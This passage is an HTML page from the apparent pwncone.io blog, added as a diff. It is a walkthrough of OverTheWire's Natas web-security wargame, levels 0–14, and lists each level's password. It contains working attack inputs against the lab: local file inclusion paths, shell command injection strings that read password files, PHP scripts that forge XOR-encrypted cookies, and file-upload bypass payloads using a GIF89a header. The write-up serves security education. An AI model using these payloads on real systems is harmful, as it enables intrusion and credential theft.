@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>overthewire Natas</strong></h1><br>
+        <a href="http://overthewire.org/wargames/natas/">http://overthewire.org/wargames/natas/</a><br>
+        <br>
+        Natas teaches the basics of server-side web-security.<br>
+        Each level of natas consists of its own website located at <a href="http://natasX.natas.labs.overthewire.org">http://natasX.natas.labs.overthewire.org</a><br>
+        All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>#Natas 0</strong></h2><br>
+        <a href="http://natas0.natas.labs.overthewire.org/">http://natas0.natas.labs.overthewire.org/</a><br>
+        natas0<br>
+        natas0<br>
+        <br>
+        Right click &gt; view source<br>
+        gtVrDuiDfck831PqWsLEZy5gyDz1clto<br>
+        <br>
+        Password for the next level:<br>
+        gtVrDuiDfck831PqWsLEZy5gyDz1clto<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>#Natas 1</strong></h2><br>
+        <a href="http://natas1.natas.labs.overthewire.org/">http://natas1.natas.labs.overthewire.org/</a><br>
+        natas1<br>
+        gtVrDuiDfck831PqWsLEZy5gyDz1clto<br>
+        <br>
+        Right clicking has been blocked...<br>
+        <br>
+        Add 'view-source:' to start of link e.g.<br>
+        view-source:<a href="http://natas1.natas.labs.overthewire.org/">http://natas1.natas.labs.overthewire.org/</a><br>
+        <br>
+        Password for the next level:<br>
+        ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>#Natas 2</strong></h2><br>
+        <a href="http://natas2.natas.labs.overthewire.org/">http://natas2.natas.labs.overthewire.org/</a><br>
+        natas2<br>
+        ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi<br>
+        <br>
+        "There is nothing on this page"<br>
+        Oh really?<br>
+        Right click &gt; view source<br>
+        /files/pixel.png has nothing for us.<br>
+        /files/pixel.png tells us there's a /files/ directory, let's check if we have access.<br>
+        We do!<br>
+        users.txt<br>
+        <br>
+        Password for the next level:<br>
+        sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>#Natas 3</strong></h2><br>
+        <a href="http://natas3.natas.labs.overthewire.org/">http://natas3.natas.labs.overthewire.org/</a><br>
+        natas3<br>
+        sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br>
+        <br>
+        Right click &gt; view source<br>
+        "Not even Google will find it this time..." - this reads as a hint to use google to me.<br>
+        We can ask google to return results only from a specific website:<br>
+        <code>inurl: natas3.natas.labs.overthewire.org/</code><br>
+        For me, google returned:<br>
+        natas3.natas.labs.overthewire.org/s3cr3t/<br>
+        <br>
+        Password for the next level:<br>
+        Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>#Natas 4</strong></h2><br>
+        <a href="http://natas4.natas.labs.overthewire.org/">http://natas4.natas.labs.overthewire.org/</a><br>
+        natas4<br>
+        Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ<br>
+        <br>
+        Access is blocked because of the referrer header, we need to have arrived here from a previous specific link.<br>
+        We need to modify our referrer header:<br>
+        1) F12 to open developer mode in Firefox &gt; navigate to the "network" tab<br>
+        2) Use the 'Refresh page' tool on the web page in order to capture a GET request<br>
+        3) Click on the GET request and modify the referrer header to: <a href="http://natas5.natas.labs.overthewire.org/">http://natas5.natas.labs.overthewire.org/</a><br>
+        Send the GET request<br>
+        Find the new request you've just received and check the response<br>
+        We should have a page saying access granted<br>
+        <br>
+        Password for the next level:<br>
+        iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>#Natas 5</strong></h2><br>
+        <a href="http://natas5.natas.labs.overthewire.org/">http://natas5.natas.labs.overthewire.org/</a><br>
+        natas5<br>
+        iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq<br>
+        <br>
+        "You are not logged in"<br>
+        Based on the last exercise, we can assume we have to change a header again<br>
+        1) F12 for developer tools &gt; network tab &gt; refresh page to capture a GET request &gt; pick the top one &gt; click 'Edit and Resend'<br>
+        2) Look at the cookies &gt; change loggedin=0 to loggenin=1 &gt; send<br>
+        Check the response<br>
+        <br>
+        Password for the next level:<br>
+        aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>#Natas 6</strong></h2><br>
+        <a href="http://natas6.natas.labs.overthewire.org/">http://natas6.natas.labs.overthewire.org/</a><br>
+        natas6<br>
+        aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1<br>
+        <br>
+        View sourcecode<br>
+        This is teaching you to read php.<br>
+        <code>include "includes/secret.inc";</code> is including variables from that file<br>
+        <code>if($secret == $_POST['secret'])</code> means: if 'secret' (variable from that document) is equal to what's sent ($_POST) then print the password<br>
+        <br>
+        So let's check out that document: <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a><br>
+        View source<br>
+        $secret = "FOEIUWGHFEEUHOFUOIU";<br>
+        <br>
+        Password for the next level:<br>
+        7z3hEENjQtflzgnT29q7wAvMNfZdh0i9<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>#Natas 7</strong></h2><br>
+        <a href="http://natas7.natas.labs.overthewire.org/">http://natas7.natas.labs.overthewire.org/</a><br>
+        natas7<br>
+        7z3hEENjQtflzgnT29q7wAvMNfZdh0i9<br>
+        <br>
+        View source &gt; &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;<br>
+        If we click home/about, we see our url turns to overthewire.org/index.php?page=about (the ?page= is the key bit here)<br>
+        Judging from the hint and the ?page= this is probably a local file inclusion vulnerability<br>
+        Navigate to:<br>
+        <a href="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</a><br>
+        <br>
+        Password for the next level:<br>
+        DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>#Natas 8</strong></h2><br>
+        <a href="http://natas8.natas.labs.overthewire.org/">http://natas8.natas.labs.overthewire.org/</a><br>
+        natas8<br>
+        DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe<br>
+        <br>
+        View sourcecode<br>
+        <code>if(encodeSecret($_POST['secret']) == $encodedSecret)</code> encodes what gets submitted using funciton encodeSecret, and the encoded submission will be checked against variable $encodedSecret<br>
+        We are given:<br>
+        $encodedSecret = "3d3d516343746d4d6d6c315669563362";<br>
+        <br>
+        function encodeSecret($secret) {<br>
+        return bin2hex(strrev(base64_encode($secret)));<br>
+        }<br>
+        <br>
+        This means we can reverse the encodeSecret function to find the key:<br>
+        1. hex2bin the $encodedSecret<br>
+        <a href="http://hex2bin.onlinephpfunctions.com/">http://hex2bin.onlinephpfunctions.com/</a><br>
+        we get: <code>==QcCtmMml1ViV3b</code><br>
+        2. reverse the string<br>
+        we get: <code>b3ViV1lmMmtCcQ==</code><br>
+        3. base64 decode it:<br>
+        we get: <code>oubWYf2kBq</code><br>
+        4. submit on webpage: oubWYf2kBq<br>
+        we get our password!<br>
+        <br>
+        Password for the next level:<br>
+        W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>#Natas 9</strong></h2><br>
+        <a href="http://natas9.natas.labs.overthewire.org/">http://natas9.natas.labs.overthewire.org/</a><br>
+        natas9<br>
+        W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl<br>
+        <br>
+        This looks like command injection, because the "find words containing" functioning is probably using a shell command to do it<br>
+        (in the source code we see it here: passthru("grep -i $key dictionary.txt"); - there's our command injection).<br>
+        <br>
+        Test if we're right:<br>
+        <code>; ls</code><br>
+        We are!<br>
+        <code>; cat /etc/natas_webpass/natas10</code><br>
+        <br>
+        Password for the next level:<br>
+        nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu<br>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>#Natas 10</strong></h2><br>
+        <a href="http://natas10.natas.labs.overthewire.org/">http://natas10.natas.labs.overthewire.org/</a><br>
+        natas10<br>
+        nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu<br>
+        <br>
+        Now we've got filtering (view sourcecode tells us that <code>;</code> and <code>&amp;</code> are filtered)<br>
+        We have to exploit grep...<br>
+        The command being sent is <code>grep -i $key dictionary.txt</code><br>
+        grep requires a pattern + file to search<br>
+        Because what gets sent in the submit form is stored in the variable $key (grep -i $key dictionary.txt) the command becomes <code>grep -i [whatever we send] dictionary.txt</code><br>
+        This means we can craft something to go in the middle. We'll send this:<br>
+        <code>. /etc/natas_webpass/natas11 #</code><br>
+        <code>grep . file.txt</code> means grep the whole file (equivalent to cat)<br>
+        <code>#</code> is bash syntax for a comment (meaning dictionary.txt will be commented out and not executed)<br>
+        The command the server is executing will look like this: <code>grep -i . /etc/natas_webpass/natas11 # dictionary.txt</code><br>
+        <br>
+        Password for the next level:<br>
+        U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK<br>
+        <br>
+        <a id="h2-12" name="h2-12"></a><strong></strong>
+        <h2><strong>#Natas 11</strong></h2><br>
+        <a href="http://natas11.natas.labs.overthewire.org/">http://natas11.natas.labs.overthewire.org/</a><br>
+        natas11<br>
+        U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK<br>
+        <br>
+        This is what XOR encryption looks like:<br>
+        original data + XOR key = encrypted data<br>
+        <br>
+        However, XOR encryption is vulnerable to known-plaintext attacks:<br>
+        i.e. original data + encrypted data = XOR key<br>
+        <br>
+        In the code that we're given in this challenge, we have both...<br>
+        the original data:<br>
+        <code>$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");</code><br>
+        and the encrypted data:<br>
+        the data cookie: <code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=</code><br>
+        <br>
+        In order to make use of these 2 bits of data to get the XOR key, we need to strip them back to when they were XOR encrypted<br>
+        <br>
+        To use our default data array, it needs to be json encoded, as seen here (this will take it back to its xor_encrypt form):<br>
+        <code>json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);</code><br>
+        <br>
+        To use our encrypted data/our cookie, we need to base64 decode it, as seen here (base64 decode will strip it back to its xor_encrypt form):<br>
+        <code>setcookie("data", base64_encode(xor_encrypt(json_encode($d))));</code><br>
+        <br>
+        Now we can just re-use the XOR encrypt function in the source code to get the XOR key.<br>
+        Here's our php script with only slight modifications from the source code:<br>
+        <br>
+        <em>natas11.php</em><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                <span style="color:#ff9d00;font-weight:700">function</span>&nbsp;xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$key</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;base64_decode<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw='</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;Iterate&nbsp;through&nbsp;each&nbsp;character</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for(</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">;</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">&lt;</span>strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">);</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">++)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">.=</span>&nbsp;<span style="color:#333333;font-weight:400">$text[$i]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">^</span>&nbsp;<span style="color:#333333;font-weight:400">$key[$i</span>&nbsp;<span style="color:#ff9d00;font-weight:400">%</span>&nbsp;strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$key</span><span style="color:#ff9d00;font-weight:400">)</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#333333;font-weight:400">$outText</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                }<br>
+                <br>
+                <span style="color:#333333;font-weight:400">$originaldata</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#7f0044;font-weight:400">array</span><span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"showpassword"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"no"</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#3ad900;font-weight:400">"bgcolor"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"#ffffff"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span>json_encode<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$originaldata</span><span style="color:#ff9d00;font-weight:400">));</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        (execute this on a linux system with php installed- kali will work well because it has php installed by default)<br>
+        <code>php natas11.php</code><br>
+        We get this:<br>
+        qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq<br>
+        <br>
+        Our key! - qw8J<br>
+        Let's just check if this is the right key. Use the qw8J in the place of $key and base64_encode it(as seen in the saveData function in the source code) - this should get us our original cookie value back (proving that qw8J is the real key)<br>
+        <br>
+        <em>natas11-keytest.php</em><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                <span style="color:#ff9d00;font-weight:700">function</span>&nbsp;xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$key</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">'qw8J'</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;Iterate&nbsp;through&nbsp;each&nbsp;character</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for(</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">;</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">&lt;</span>strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">);</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">++)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">.=</span>&nbsp;<span style="color:#333333;font-weight:400">$text[$i]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">^</span>&nbsp;<span style="color:#333333;font-weight:400">$key[$i</span>&nbsp;<span style="color:#ff9d00;font-weight:400">%</span>&nbsp;strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$key</span><span style="color:#ff9d00;font-weight:400">)</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#333333;font-weight:400">$outText</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                }<br>
+                <br>
+                <span style="color:#333333;font-weight:400">$originaldata</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#7f0044;font-weight:400">array</span><span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"showpassword"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"no"</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#3ad900;font-weight:400">"bgcolor"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"#ffffff"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;base64_encode<span style="color:#ff9d00;font-weight:400">(</span>xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span>json_encode<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$originaldata</span><span style="color:#ff9d00;font-weight:400">)));</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <code>php natas11-keytest.php</code><br>
+        ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=<br>
+        <br>
+        That's our original cookie value! Meaning that our key is correct. Now, we just need to modify the script to showpassword=yes, submit our new cookie value to the server, and get our answer.<br>
+        <br>
+        <em>natas11-passwordyes.php</em><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                <span style="color:#ff9d00;font-weight:700">function</span>&nbsp;xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$key</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">'qw8J'</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;Iterate&nbsp;through&nbsp;each&nbsp;character</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for(</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">;</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">&lt;</span>strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$text</span><span style="color:#ff9d00;font-weight:400">);</span><span style="color:#333333;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:400">++)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$outText</span>&nbsp;<span style="color:#ff9d00;font-weight:400">.=</span>&nbsp;<span style="color:#333333;font-weight:400">$text[$i]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">^</span>&nbsp;<span style="color:#333333;font-weight:400">$key[$i</span>&nbsp;<span style="color:#ff9d00;font-weight:400">%</span>&nbsp;strlen<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$key</span><span style="color:#ff9d00;font-weight:400">)</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#333333;font-weight:400">$outText</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                }<br>
+                <br>
+                <span style="color:#333333;font-weight:400">$originaldata</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#7f0044;font-weight:400">array</span><span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"showpassword"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"yes"</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#3ad900;font-weight:400">"bgcolor"</span><span style="color:#ff9d00;font-weight:400">=&gt;</span><span style="color:#3ad900;font-weight:400">"#ffffff"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;base64_encode<span style="color:#ff9d00;font-weight:400">(</span>xor_encrypt<span style="color:#ff9d00;font-weight:400">(</span>json_encode<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$originaldata</span><span style="color:#ff9d00;font-weight:400">)));</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <code>php natas11-passwordyes.php</code><br>
+        ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK<br>
+        <br>
+        Now submit our new cookie value to the website:<br>
+        1) F12 to bring up developer mode in firefox<br>
+        2) Navigate to network tab<br>
+        3) Refresh the page to have a GET request show up<br>
+        4) Right click the top option (none of the css/image requests), should look like this:<br>
+        200 GET / natas11.natas.labs.overthewire.org/ document html<br>
+        5) Click 'edit and resend'<br>
+        6) Find "Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"<br>
+        7) Replace the "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D" with "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"<br>
+        8) Click send<br>
+        <br>
+        A new request should come up in your network tab, most likely at the bottom<br>
+        Click on that, then click the response tab. You should see your password displayed in the response!<br>
+        <br>
+        Password for the next level:<br>
+        EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
+        <br>
+        <a id="h2-13" name="h2-13"></a><strong></strong>
+        <h2><strong>#Natas 12</strong></h2><br>
+        <a href="http://natas12.natas.labs.overthewire.org/">http://natas12.natas.labs.overthewire.org/</a><br>
+        natas12<br>
+        EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
+        <br>
+        "Choose a JPEG to upload (max 1KB):"<br>
+        It looks like this challenge is going to be about bypassing file upload restrictions<br>
+        <br>
+        View sourcecode<br>
+            <div class="codebox">
+                if(filesize($_FILES['uploadedfile']['tmp_name'])&nbsp;&gt;&nbsp;1000)&nbsp;{<br>
+                echo&nbsp;"File&nbsp;is&nbsp;too&nbsp;big";
+            </div>
+        </div><br>
+        <br>
+        It seems like the only restriction is a file size of 1kb.<br>
+        Considering this is an online wargame it wouldn't be wise to upload a php shell; it's not a virtual machine.<br>
+        <br>
+        Instead, we can write a line of php that will read the password from /etc/natas_webpass/natas13:<br>
+        <br>
+        <em>readpls.php</em><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?</span><br>
+                readfile<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"/etc/natas_webpass/natas13"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        Now to get our password. Use firefox for all of this:<br>
+        1) F12 to bring up developer tools in firefox and navigate to the 'Network' tab<br>
+        2) Upload our file (in my case readpls.php)<br>
+        3) Now we should have the POST request uploading our file in the network tab of the developer tools<br>
+        4) Right click on it &gt; Edit and Resend<br>
+        5) Look in the request body and scroll down until you find &lt;randomfilename&gt;.jpg and change .jpg to .php<br>
+        6) Click send, find the request in your 'Network' tab and select it and wait for a response<br>
+        7) Navigate to the url you receive in the response, and you should have your password!<br>
+        <br>
+        Password for the next level:<br>
+        jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY<br>
+        <br>
+        <a id="h2-14" name="h2-14"></a><strong></strong>
+        <h2><strong>#Natas 13</strong></h2><br>
+        <a href="http://natas13.natas.labs.overthewire.org/">http://natas13.natas.labs.overthewire.org/</a><br>
+        natas13<br>
+        jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY<br>
+        <br>
+        "For security reasons, we now only accept image files!"<br>
+        A similar challenge again to natas 12.<br>
+        <br>
+        If we view the sourcecode, you'll find:<br>
+            <div class="codebox">
+                }&nbsp;else&nbsp;if&nbsp;(!&nbsp;exif_imagetype($_FILES['uploadedfile']['tmp_name']))&nbsp;{<br>
+                echo&nbsp;"File&nbsp;is&nbsp;not&nbsp;an&nbsp;image";
+            </div>
+        </div><br>
+        <br>
+        Googling 'exif_imagetype' will tell you that this php function reads the first bytes of an image to check its file signature<br>
+        Knowing this, we now need to add a file signature for an image when we upload our php script (we'll use GIF89a; - it's worked for me in the past)<br>
+        <br>
+        1) Write out our php file (called readpass.php):<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?</span><br>
+                readfile<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"/etc/natas_webpass/natas14"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        2) Open up dev tools in firefox (f12), navigate to the network tab, and upload our php file<br>
+        3) Select the POST request we've just got in our network tab, right click and pick edit and resend<br>
+        4) Look in the request body and find your php script. Just before it starts (underneath content type: image/jpeg) add our image header- GIF89a;<br>
+        <br>
+            <div class="codebox">
+                GIF89a;<br>
+                <span style="color:#ff9d00;font-weight:700">&lt;?</span><br>
+                readfile<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"/etc/natas_webpass/natas14"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        5) Send!<br>
+        6) Check the new POST request in the network tab and wait for the reposnse. You should get an 'upload/&lt;filename&gt;.php' - navigate to that link and you should get the password for natas14!<br>
+        <br>
+        Password for the next level:<br>
+        Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1<br>
+        <br>
+        <a id="h2-15" name="h2-15"></a><strong></strong>
+        <h2><strong>#Natas 14</strong></h2><br>
+        <a href="http://natas14.natas.labs.overthewire.org/">http://natas14.natas.labs.overthewire.org/</a><br>
+        natas14<br>
+        Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1<br>
+        <br>
+        A login form!<br>
+        <br>
+        View sourcode:<br>
+            <div class="codebox">
+                $query&nbsp;=&nbsp;"SELECT&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=\"".$_REQUEST["username"]."\"&nbsp;and&nbsp;password=\"".$_REQUEST["password"]."\"";<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if(array_key_exists("debug",&nbsp;$_GET))&nbsp;{<br>
